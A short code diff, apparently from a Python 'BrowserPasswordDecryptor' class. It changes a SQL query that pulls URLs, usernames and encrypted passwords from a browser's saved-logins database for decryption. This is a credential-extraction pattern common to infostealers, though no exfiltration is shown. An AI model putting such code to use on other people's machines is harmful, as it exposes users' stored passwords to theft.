@@ -135,7 +135,7 @@ class BrowserPasswordDecryptor:
         try:
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
             credentials = []
             
             for url, username, ciphertext in cursor.fetchall():
